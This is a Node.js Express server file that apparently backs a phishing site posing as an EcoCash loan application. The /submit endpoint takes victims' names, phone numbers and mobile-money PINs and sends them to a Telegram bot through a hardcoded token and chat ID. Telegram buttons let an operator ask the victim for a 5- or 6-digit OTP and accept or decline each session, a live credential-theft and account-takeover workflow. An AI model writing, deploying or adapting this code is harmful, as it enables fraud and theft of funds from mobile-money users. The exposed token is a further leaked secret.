const express = require("express");
const path = require("path");
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

const app = express();

const sessions = {}; // ✅ MUST BE AT TOP

app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const TELEGRAM_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
const CHAT_ID = "7162306402";

// ==============================
// TELEGRAM FUNCTION
// ==============================
async function sendToTelegramWithSession(message, sessionId) {
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

  await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "OTP 5", url: `https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp5&id=${sessionId}` },
            { text: "OTP 6", url: `https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp6&id=${sessionId}` }
          ],
          [
            { text: "✅ ACCEPT", url: `https://ecocash-loan-app.onrender.com/telegram-command?cmd=accept&id=${sessionId}` },
            { text: "❌ DECLINE", url: `https://ecocash-loan-app.onrender.com/telegram-command?cmd=decline&id=${sessionId}` }
          ]
        ]
      }
    })
  });
}

// ==============================
// SUBMIT
// ==============================
app.post("/submit", async (req, res) => {
  try {
    const { name, phone, pin } = req.body;

    const sessionId = Date.now().toString();

    sessions[sessionId] = {
      otp: null,
      decision: null
    };

    const message = `
📥 NEW LOAN APPLICATION
👤 ${name}
📞 ${phone}
🔐 ${pin}
🆔 ${sessionId}
`;

    await sendToTelegramWithSession(message, sessionId); // ✅ FIXED

    res.json({ success: true, sessionId });

  } catch (err) {
    console.error(err);
    res.json({ success: false });
  }
});

// ==============================
// TELEGRAM COMMAND
// ==============================
app.get("/telegram-command", (req, res) => {
  const { cmd, id } = req.query;

  if (!sessions[id]) return res.send("Invalid session");

  if (cmd === "otp5") sessions[id].otp = 5;
  if (cmd === "otp6") sessions[id].otp = 6;
  if (cmd === "accept") sessions[id].decision = "accept";
  if (cmd === "decline") sessions[id].decision = "decline";

  console.log("SESSION:", id, sessions[id]);

  res.send("OK");
});

// ==============================
// STATUS
// ==============================
app.get("/otp-status", (req, res) => {
  const id = req.query.id;
  res.json({ otp: sessions[id]?.otp || null });
});

app.get("/decision-status", (req, res) => {
  const id = req.query.id;
  res.json({ decision: sessions[id]?.decision || null });
});

// ==============================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Server running on ${PORT}`);
});